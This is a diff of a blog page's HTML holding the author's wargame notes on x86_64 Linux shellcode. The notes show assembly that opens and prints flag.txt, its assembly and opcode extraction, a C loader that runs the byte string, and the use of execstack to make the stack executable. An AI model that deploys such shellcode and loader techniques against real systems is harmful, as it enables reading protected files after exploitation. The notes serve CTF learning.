@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -121,7 +121,7 @@
             <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
                 <div id="niu2-main-content">
                     <p>While playing some <a href="http://blog.dornea.nu/tag/wargames/">wargames</a> where I had to read a file called <strong>flag.txt</strong> using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.</p>
-<div class="highlight"><pre><span class="nf">BITS</span> <span class="mi">64</span>
+<div class="highlight"><pre><span></span><span class="nf">BITS</span> <span class="mi">64</span>
 <span class="err">;</span> <span class="nf">Author</span> <span class="no">Mr.Un1k0d3r</span> <span class="p">-</span> <span class="no">RingZer0</span> <span class="no">Team</span>
 <span class="err">;</span> <span class="nf">Read</span> <span class="err">/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwd</span> <span class="no">Linux</span> <span class="no">x86_64</span> <span class="no">Shellcode</span>
 <span class="err">;</span> <span class="nf">Shellcode</span> <span class="no">size</span> <span class="mi">82</span> <span class="no">bytes</span>
@@ -136,7 +136,7 @@
 <span class="err">;</span> <span class="nf">syscall</span> <span class="no">open</span> <span class="no">file</span>
     <span class="nf">pop</span> <span class="no">rdi</span> <span class="err">;</span> <span class="no">pop</span> <span class="no">path</span> <span class="no">value</span>
     <span class="err">;</span> <span class="nf">NULL</span> <span class="no">byte</span> <span class="no">fix</span>
-    <span class="nf">xor</span> <span class="no">byte</span> <span class="err">[</span><span class="no">rdi</span> <span class="err">+</span> <span class="mi">11</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x41</span>
+    <span class="nf">xor</span> <span class="no">byte</span> <span class="p">[</span><span class="no">rdi</span> <span class="err">+</span> <span class="mi">11</span><span class="p">],</span> <span class="mi">0x41</span>
 
     <span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
     <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">2</span>
@@ -145,7 +145,7 @@
 
 <span class="err">;</span> <span class="nf">syscall</span> <span class="no">read</span> <span class="no">file</span>
     <span class="nf">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="mi">0xfff</span>
-    <span class="nf">lea</span> <span class="no">rsi</span><span class="p">,</span> <span class="err">[</span><span class="no">rsp</span><span class="err">]</span>
+    <span class="nf">lea</span> <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span>
     <span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
     <span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
     <span class="nf">mov</span> <span class="no">dx</span><span class="p">,</span> <span class="mi">0xfff</span><span class="err">;</span> <span class="no">size</span> <span class="no">to</span> <span class="no">read</span>
@@ -171,11 +171,11 @@
 </pre></div>
 <h2 id="0464de5a27d6ea7620de8f123c25b73b">Shellcode compilation</h2>
 <p>Compile using <strong>nasm</strong>:</p>
-<div class="highlight"><pre><span class="nv">$ </span>nasm -f elf64 shellcode.asm -o shellcode.o
+<div class="highlight"><pre><span></span>$ nasm -f elf64 shellcode.asm -o shellcode.o
 </pre></div>
 <h2 id="ecb7677e094d5e91766c7aae919dfc12">Disassemble</h2>
 <p>Now you can disassemble the object file using <strong>objdump</strong>:</p>
-<div class="highlight"><pre>shellcode.o:     file format elf64-x86-64
+<div class="highlight"><pre><span></span>shellcode.o:     file format elf64-x86-64
 
 
 Disassembly of section .text:
@@ -185,26 +185,26 @@ Disassembly of section .text:
 
 <span class="m">0000000000000002</span> &lt;_readfile&gt;:
    2:   5f                      pop    %rdi
-   3:   <span class="m">80</span> <span class="m">77</span> 0b <span class="m">41</span>             xorb   <span class="nv">$0x41</span>,0xb<span class="o">(</span>%rdi<span class="o">)</span>
+   3:   <span class="m">80</span> <span class="m">77</span> 0b <span class="m">41</span>             xorb   <span class="nv">$0</span>x41,0xb<span class="o">(</span>%rdi<span class="o">)</span>
    7:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
-   a:   <span class="m">04</span> <span class="m">02</span>                   add    <span class="nv">$0x2</span>,%al
+   a:   <span class="m">04</span> <span class="m">02</span>                   add    <span class="nv">$0</span>x2,%al
    c:   <span class="m">48</span> <span class="m">31</span> f6                xor    %rsi,%rsi
    f:   0f <span class="m">05</span>                   syscall 
-  11:   <span class="m">66</span> <span class="m">81</span> ec ff 0f          sub    <span class="nv">$0xfff</span>,%sp
+  11:   <span class="m">66</span> <span class="m">81</span> ec ff 0f          sub    <span class="nv">$0</span>xfff,%sp
   16:   <span class="m">48</span> 8d <span class="m">34</span> <span class="m">24</span>             lea    <span class="o">(</span>%rsp<span class="o">)</span>,%rsi
   1a:   <span class="m">48</span> <span class="m">89</span> c7                mov    %rax,%rdi
   1d:   <span class="m">48</span> <span class="m">31</span> d2                xor    %rdx,%rdx
-  20:   <span class="m">66</span> ba ff 0f             mov    <span class="nv">$0xfff</span>,%dx
+  20:   <span class="m">66</span> ba ff 0f             mov    <span class="nv">$0</span>xfff,%dx
   24:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
   27:   0f <span class="m">05</span>                   syscall 
   29:   <span class="m">48</span> <span class="m">31</span> ff                xor    %rdi,%rdi
-  2c:   <span class="m">40</span> <span class="m">80</span> c7 <span class="m">01</span>             add    <span class="nv">$0x1</span>,%dil
+  2c:   <span class="m">40</span> <span class="m">80</span> c7 <span class="m">01</span>             add    <span class="nv">$0</span>x1,%dil
   30:   <span class="m">48</span> <span class="m">89</span> c2                mov    %rax,%rdx
   33:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
-  36:   <span class="m">04</span> <span class="m">01</span>                   add    <span class="nv">$0x1</span>,%al
+  36:   <span class="m">04</span> <span class="m">01</span>                   add    <span class="nv">$0</span>x1,%al
   38:   0f <span class="m">05</span>                   syscall 
   3a:   <span class="m">48</span> <span class="m">31</span> c0                xor    %rax,%rax
-  3d:   <span class="m">04</span> 3c                   add    <span class="nv">$0x3c</span>,%al
+  3d:   <span class="m">04</span> 3c                   add    <span class="nv">$0</span>x3c,%al
   3f:   0f <span class="m">05</span>                   syscall 
 
 <span class="m">0000000000000041</span> &lt;_push_filename&gt;:
@@ -218,17 +218,17 @@ Disassembly of section .text:
 </pre></div>
 <h2 id="f02261a0a5ad1f239afb5f846cb74c93">Assembler to C</h2>
 <p>Now convert the opcodes to some C array:</p>
-<div class="highlight"><pre><span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>objdump -d shellcode.o <span class="p">|</span>grep <span class="s2">"^ "</span> <span class="p">|</span>cut -f2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s1">'\\x'</span><span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
+<div class="highlight"><pre><span></span>$ <span class="k">for</span> i in <span class="k">$(</span>objdump -d shellcode.o <span class="p">|</span>grep <span class="s2">"^ "</span> <span class="p">|</span>cut -f2<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s1">'\\x'</span><span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
 <span class="se">\x</span>eb<span class="se">\x</span>3f<span class="se">\x</span>5f<span class="se">\x</span>80<span class="se">\x</span>77<span class="se">\x</span>0b<span class="se">\x</span>41<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>02<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>ec<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>48<span class="se">\x</span>8d<span class="se">\x</span>34<span class="se">\x</span>24<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c7<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>66<span class="se">\x</span>ba<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>40<span class="se">\x</span>80<span class="se">\x</span>c7<span class="se">\x</span>01<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>c2<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>01<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>04<span class="se">\x</span>3c<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>e8<span class="se">\x</span>bc<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>66<span class="se">\x</span>6c<span class="se">\x</span>61<span class="se">\x</span>67<span class="se">\x</span>2e<span class="se">\x</span>74<span class="se">\x</span>78<span class="se">\x</span>74
 </pre></div>
 <p>Now use this code:</p>
-<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-<span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;unistd.h&gt;</span>
-<span class="cp">#include &lt;fcntl.h&gt;</span>
-<span class="cp">#include &lt;sys/types.h&gt;</span>
-<span class="cp">#include &lt;sys/stat.h&gt;</span>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
 
 <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
 <span class="s">"</span><span class="se">\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span class="s">"</span><span class="p">;</span>
@@ -241,14 +241,14 @@ Disassembly of section .text:
 </pre></div>
 <h2 id="bd1c8253223bcef1ddd2dbf8e157d42d">C code compilation</h2>
 <p>... and compile it.</p>
-<div class="highlight"><pre><span class="nv">$ </span>gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
+<div class="highlight"><pre><span></span>$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
 bin.c: In <span class="k">function</span> <span class="s1">'main'</span>:
 bin.c:20:1: warning: control reaches end of non-void <span class="k">function</span> <span class="o">[</span>-Wreturn-type<span class="o">]</span>
  <span class="o">}</span>
 </pre></div>
 <h2 id="4251f63cae49679e4047bdde24b087c4">Make stack executable</h2>
 <p>The binary will segfault if executed. That's because the stack isn't executable:</p>
-<div class="highlight"><pre><span class="nv">$ </span>readelf -l bin <span class="p">|</span> grep -C <span class="m">2</span> GNU_STACK
+<div class="highlight"><pre><span></span>$ readelf -l bin <span class="p">|</span> grep -C <span class="m">2</span> GNU_STACK
 
   GNU_EH_FRAME   0x00000000000005e4 0x00000000004005e4 0x00000000004005e4
                  0x0000000000000034 0x0000000000000034  R      4
@@ -256,12 +256,12 @@ bin.c:20:1: warning: control reaches end of non-void <span class="k">function</s
                  0x0000000000000000 0x0000000000000000  RW     10
 </pre></div>
 <p>Let's make the stack executable:</p>
-<div class="highlight"><pre><span class="nv">$ </span>/usr/sbin/execstack -s bin
+<div class="highlight"><pre><span></span>$ /usr/sbin/execstack -s bin
 </pre></div>
 <p>And finally run the executable:</p>
-<div class="highlight"><pre><span class="nv">$ </span>cat flag.txt
+<div class="highlight"><pre><span></span>$ cat flag.txt
 bla
-<span class="nv">$ </span>./bin
+$ ./bin
 bla
 </pre></div>
                 </div>
@@ -304,9 +304,9 @@ bla
                     <div class="niu2-sidebar-value"><a href="http://blog.dornea.nu/category/notes">notes</a></div>
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/c/">c</a><sup>8</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/asm/">asm</a><sup>2</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>8</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/asm/">asm</a><sup>4</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/ctf/">ctf</a><sup>10</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                 </div>
 
                 <div id="niu2-sidebar-toc" class="niu2-sidebar" data-status="closed">
